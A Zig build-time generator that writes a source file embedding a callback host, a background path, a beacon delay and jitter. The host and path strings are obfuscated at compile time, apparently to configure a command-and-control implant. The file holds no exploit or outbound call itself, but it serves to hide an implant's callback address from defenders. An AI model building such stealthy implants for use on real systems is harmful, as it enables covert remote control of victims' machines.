const std = @import("std");

const obfuscation = @import("obfuscation");

pub fn main() !void {
    var arena_state = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();

    const args = try std.process.argsAlloc(arena);

    if (args.len != 6) fatal("wrong number of arguments", .{});

    const output_file_path = args[1];
    const callback_host = args[2];
    const host_background_path = args[3];
    const callback_delay = args[4];
    const callback_jitter = args[5];

    var output_file = std.fs.cwd().createFile(output_file_path, .{}) catch |err| {
        fatal("unable to open '{s}': {s}", .{ output_file_path, @errorName(err) });
    };
    defer output_file.close();

    const source = try std.fmt.allocPrint(arena,
        \\ const obfuscation = @import("obfuscation");
        \\pub const callback_host: []const u8 = &obfuscation.comptimeObfuscation("{s}");
        \\pub const host_background_path: []const u8 = &obfuscation.comptimeObfuscation("{s}");
        \\pub const callback_delay: u32 = {s};
        \\pub const callback_jitter: u32 = {s};
    , .{ callback_host, host_background_path, callback_delay, callback_jitter });

    try output_file.writeAll(source);

    return std.process.cleanExit();
}

fn fatal(comptime format: []const u8, args: anytype) noreturn {
    std.debug.print(format, args);
    std.process.exit(1);
}
